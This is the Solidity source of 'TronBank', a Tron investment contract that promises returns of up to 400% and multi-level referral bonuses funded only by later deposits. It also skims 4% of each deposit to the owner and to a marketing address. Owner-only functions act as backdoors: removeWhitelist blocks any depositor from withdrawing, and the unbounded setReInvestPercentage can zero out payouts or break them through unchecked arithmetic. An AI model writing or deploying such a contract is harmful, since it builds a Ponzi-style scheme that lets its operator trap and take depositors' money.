//SourceUnit: tronbank.sol

pragma solidity 0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

contract TronBank {
    using SafeMath for uint256;

    struct Deposit {
        uint8 plan;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested; 
        uint256 total_withdrawn;  
        uint256 total_match_bonus;
        Deposit[] deposits; 
        mapping(uint8 => uint256) structure;
    }
    
    struct Plan {
        uint256 plan_days;
        uint256 percentage;
    }
    
    address public owner;
    
    address public marketing;
    uint256 private reInvestPercentage;
    uint256 public releaseTime = 1600281000;
    uint256 public invested; 
    uint256 public minimum = 5 * 1e7 ;
    uint256 public withdrawn;
    uint256 public totalPercentage;
    uint256 public totalPlayers;
    uint256 public direct_bonus;
    uint256 public match_bonus;

    uint8[] public ref_bonuses;

    Plan[] public plans;
    mapping(address => Player) public players;
    mapping(address => bool) public whiteListed;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 plan);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event WithdrawalDeposit(address indexed addr, uint256 amount, uint8 plan);

    constructor(address _marketing) public {
        owner = msg.sender;
        marketing = _marketing;
        reInvestPercentage = 10;
        totalPercentage = 100;
        totalPlayers = 0;
        whiteListed[owner] = true;

        plans.push(Plan(200, 400));
        plans.push(Plan(45, 135));
        plans.push(Plan(30, 120));
        plans.push(Plan(23, 115));

        ref_bonuses.push(20);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
    
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0)) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount / 200;
                direct_bonus += _amount / 200;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 200);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Plan storage plan = plans[dep.plan];

            uint256 time_end = dep.time + plan.plan_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += (dep.amount * (to - from) * plan.percentage / plan.plan_days / 8640000);
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            uint256 bonus = _amount * ref_bonuses[i] / 1000;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }
    
    function deposit(uint8 _plan, address _upline) external payable {
        require(plans[_plan].plan_days > 0, "Plan not found");
        require(msg.value >= minimum, "Less than minimum");
        require(now >= releaseTime, "not open yet");
        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");
        whiteListed[msg.sender]=true;
        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            plan: _plan,
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;
        totalPlayers +=1;

        _refPayout(msg.sender, msg.value);

        owner.transfer(msg.value.mul(4).div(100));
        marketing.transfer(msg.value.mul(4).div(100));

        emit NewDeposit(msg.sender, msg.value, _plan);
    }

    function withdraw() payable external {
        require(whiteListed[msg.sender] == true,"unauthorized call");
        
        Player storage player = players[msg.sender];

        _payout(msg.sender);
        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");
        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;
        
        require(amount >= minimum, "Less than minimum");
        require(player.deposits.length < 100, "Max 100 deposits per address");
        
        uint256 WithdrawAmount = amount.mul(totalPercentage-reInvestPercentage).div(100);
        uint256 reInvestAmount = amount.mul(reInvestPercentage).div(100);
        
        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += WithdrawAmount;
        withdrawn += WithdrawAmount;
        
        msg.sender.transfer(WithdrawAmount);
        emit Withdraw(msg.sender, WithdrawAmount);
        
         _setUpline(msg.sender, owner, reInvestAmount);
         
        player.deposits.push(Deposit({
            plan: 0,
            amount: reInvestAmount,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        player.total_invested += reInvestAmount;
        invested += reInvestAmount;
        
        _refPayout(msg.sender, reInvestAmount);

        owner.transfer(reInvestAmount.mul(4).div(100));
        marketing.transfer(reInvestAmount.mul(4).div(100));

        emit WithdrawalDeposit(msg.sender, reInvestAmount, 0);
        
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Plan storage plan = plans[dep.plan];

            uint256 time_end = dep.time + plan.plan_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * plan.percentage / plan.plan_days / 8640000;
            }
        }

        return value;
    }

    function setWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = true;
    }

    function removeWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = false;
    }

    function setReInvestPercentage(uint256 percent) public {
        require(msg.sender == owner,"unauthorized call");
        reInvestPercentage = percent;
    }

    
    
    function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Plan storage plan = plans[dep.plan];

            uint256 time_end = dep.time + plan.plan_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                values[i] = dep.amount * (to - from) * plan.percentage / plan.plan_days / 8640000;
            }
        }

        return values;
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
    

    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          Plan storage plan = plans[dep.plan];

          _ids[i] = dep.plan;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + plan.plan_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

    
}